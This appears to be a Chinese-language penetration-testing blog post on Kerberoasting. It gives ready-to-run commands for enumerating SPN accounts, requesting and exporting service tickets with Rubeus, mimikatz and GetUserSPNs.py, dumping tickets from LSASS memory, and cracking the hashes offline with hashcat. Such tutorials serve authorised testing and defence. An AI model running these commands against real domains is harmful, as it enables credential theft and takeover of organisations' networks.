---
title: 攻击方式 - Kerberoasting
date: 2026-08-14 15:30:00
categories:
  - 渗透测试
tags:
  - Kerberoasting
  - Kerberos
  - 域渗透
description: Kerberoasting 获取服务票据并离线爆破密码的方法
---

定义：攻击者通过正常域用户密码认证获取 TGT，利用该 TGT 请求指定 SPN 的 ST 时指定 易破解的 RC4_HMAC_MD5 加密类型。若 TGT 有效，KDC 会用注册该 SPN 的账户 Hash 加密 ST 返回，攻击者提取后可离线爆破出该账户明文密码，如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域。

### 攻击条件：
1. 攻击者拥有**一个有效的域用户账户和密码**（能正常申请 TGT）
2. 目标服务账户在 AD 中**注册了 SPN****（Service Principal Name）**
3. 攻击者网络可达域控（KDC），能与 **88 端口**通信
4. 服务账户密码强度较弱（可被字典爆破）
5. 不需要管理员权限，普通域用户即可请求任意 SPN 的 ST

### 实战场景：
在域环境里，拿到普通域用户权限后，找**注册了 SPN 的服务账户**，请求其 TGS 服务票据并离线爆破密码。

### 攻击过程：
#### 查询域内注册于域用户下的SPN
##### 工具1：RiskySPN
RiskySPN是一个PowerShell脚本的集合，专检测与SPN相关的账户是否滥用，自动识别弱密码服务票据

```bash
# 1. 导入模块
Import-Module .\RiskySPN.psm1

# 2. 查询域内所有注册了 SPN 的用户账户
Get-RiskySPN

# 3. 自动识别弱密码服务票据（核心功能）
Find-PotentiallyCrackableAccounts

# 4. 请求指定 SPN 的 TGS 票据并导出 hash（hashcat 格式）
Get-TGSCipher -SPN "MSSQLSVC/server01.域名.com" -Format hashcat

# 5. 批量一键操作：查找 + 请求 + 导出所有可破解账户的 hash
Find-PotentiallyCrackableAccounts | Get-TGSCipher -Format hashcat
```

##### 工具2：PowerView.ps1
```bash
# 1. 导入 PowerView 模块
Import-Module .\PowerView.ps1

# 2. 查询所有注册了 SPN 的用户账户（最常用）
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# 3. 新版 PowerView 命令（Dev 分支）
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

#### 请求指定SPN的ST
##### Ruberus
```bash
# 请求指定 SPN 的 ST + 导出 hash
Rubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt

# 批量请求所有 SPN
Rubeus.exe kerberoast /outfile:hash.txt
```

##### mimikatz
```bash
# 请求指定 SPN 的 ST
kerberos::ask /target:服务名/主机名.域名.com

# 导出所有票据
kerberos::list /export
```

##### GetUserSPNs.py
```bash
# 请求指定 SPN 的 ST + 导出 hash
python GetUserSPNs.py 域名/用户名:密码 -request -spn 服务名/主机名.域名.com -outputfile hash.txt

# 批量请求所有 SPN
python GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt
```

#### 导出请求的ST
##### 查看内存中的票据
用cmd:

```bash
Klist
```

##### 导出内存中的票据
###### mimikatz：
（在mimikatz同目录下直接导出.kirbi文件）

```bash
kerberos::list /export
```

补充：从 LSASS 内存中提取（mimikatz 另一种方式）

```plain
# 从LSASS进程内存中提取所有Kerberos票据
sekurlsa::kerberos /export
```

> 这种方式需要管理员权限，能拿到所有登录用户的票据，包括别人的
>

######  Rubeus  ：
```bash
# 导出所有 Kerberos 票据（包括 ST）为 .kirbi 文件
Rubeus.exe dump /outfile:tickets
```

######  GetUserSPNs.py  
```bash
# 直接导出 hashcat 格式，不用 kirbi 中转
python GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt
```

#### 离线爆破ST
#####  格式转换（kirbi → hashcat ）
###### 用 Rubeus 转换 
```plain
Rubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt
```

###### 用hashcat爆破
用Rubeus或GetUserSPNs.py导出的hash.txt用以下命令：

```plain
hashcat -m 13100 hash.txt rockyou.txt
```

##### 用 tgsrepcrack.py脚本
 对mimikatz导出的.kirbi票据进行爆破：

```plain
python tgsrepcrack.py rockyou.txt ticket.kirbi
```



>  AS-REP Roasting 的 hash，hashcat 用 `-m 18200`，Kerberoasting 的用 `-m 13100`，别搞混了  
>
